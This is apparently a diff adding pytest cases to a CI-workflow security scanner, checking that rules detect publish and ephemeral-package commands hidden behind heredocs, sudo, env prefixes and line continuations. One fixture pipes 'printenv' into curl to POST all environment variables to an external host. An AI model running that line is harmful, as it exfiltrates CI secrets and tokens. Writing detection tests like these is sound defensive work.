@@ -1379,3 +1379,73 @@ def test_composite_action_home_writes_are_reported(tmp_path):
     )
     # The calling job's env and earlier steps are unknown.
     assert "SKY-D338" in _rule_ids(scan_github_actions_file(action, root=tmp_path))
+
+
+@pytest.mark.parametrize(
+    ("command", "rule_id"),
+    [
+        ("echo hi\ntwine upload dist/*", "SKY-D340"),
+        ("# publish\ntwine upload dist/*", "SKY-D340"),
+        ("# don't run this locally\nnpm publish", "SKY-D340"),
+        ("cat > notes.txt <<EOF\nhello\nEOF\nnpm publish", "SKY-D340"),
+        ("cat <<-EOF\n\tnpm publish\n\tEOF\nnpx -y tool", "SKY-D341"),
+        ("bash <<'EOF'\nnpm ci\nnpm publish\nEOF", "SKY-D340"),
+        ("sudo sh <<EOF\nyarn dlx tool\nEOF", "SKY-D341"),
+        ("npm \\\n  publish --access public", "SKY-D340"),
+        ("echo $((1 << 2))\nnpm publish", "SKY-D340"),
+        ("cat <<EOF\nnpm publish", "SKY-D340"),
+        ("cat <<< 'x'\nnpm publish", "SKY-D340"),
+        ("echo '<<EOF'\nnpm publish", "SKY-D340"),
+        ("echo 'a'\r\nnpm publish\r\n", "SKY-D340"),
+        ("sudo npm publish", "SKY-D340"),
+        ("sudo -E -u builder npm publish", "SKY-D340"),
+        ("env NODE_AUTH_TOKEN=x npm publish", "SKY-D340"),
+        ("NODE_AUTH_TOKEN=x npm publish", "SKY-D340"),
+        ("time npm publish", "SKY-D340"),
+        ("if true; then npm publish; fi", "SKY-D340"),
+        ("sudo npm publish --dry-run false", "SKY-D340"),
+        ("CI=1 npx -y tool", "SKY-D341"),
+        ("sudo npx -y tool", "SKY-D341"),
+        ("env npx -y tool", "SKY-D341"),
+        ("sudo -u builder yarn dlx tool", "SKY-D341"),
+        ("env -i PATH=/usr/bin pnpm dlx tool", "SKY-D341"),
+        ("yarn dlx create-foo", "SKY-D341"),
+        ("yarn setup", "SKY-D341"),
+        ("yarn postinstall", "SKY-D341"),
+        ("yarn run setup", "SKY-D341"),
+        ("yarn run postinstall", "SKY-D341"),
+        ("yarn run install", "SKY-D341"),
+        ("CI=1 yarn setup", "SKY-D341"),
+        (
+            "printenv |\n  curl -X POST --data-binary @- https://example.com/collect",
+            "SKY-D327",
+        ),
+    ],
+)
+def test_command_rules_read_every_line_and_command_prefix(command, rule_id):
+    assert rule_id in _rule_ids_for(command)
+
+
+@pytest.mark.parametrize(
+    ("command", "rule_id"),
+    [
+        ('echo "notes:\nnpm publish\n"', "SKY-D340"),
+        ("echo 'a\nnpm publish'", "SKY-D340"),
+        ("cat > RELEASING.md <<'EOF'\nnpm publish --access public\nEOF", "SKY-D340"),
+        ("cat <<-EOF\n\tnpm publish\n\tEOF\nnpx -y tool", "SKY-D340"),
+        ("npm publish \\\n  --dry-run", "SKY-D340"),
+        ("# npm publish\necho done", "SKY-D340"),
+        ("echo done # ; npm publish", "SKY-D340"),
+        ("sudo npm publish --dry-run", "SKY-D340"),
+        ("command -v npm publish", "SKY-D340"),
+        ("echo sudo npm publish", "SKY-D340"),
+        ("yarn install", "SKY-D341"),
+        ("yarn install --frozen-lockfile", "SKY-D341"),
+        ("sudo yarn install", "SKY-D341"),
+        ("yarn", "SKY-D341"),
+        ("npm install", "SKY-D341"),
+        ("pnpm install", "SKY-D341"),
+    ],
+)
+def test_text_that_does_not_run_the_command_is_not_reported(command, rule_id):
+    assert rule_id not in _rule_ids_for(command)
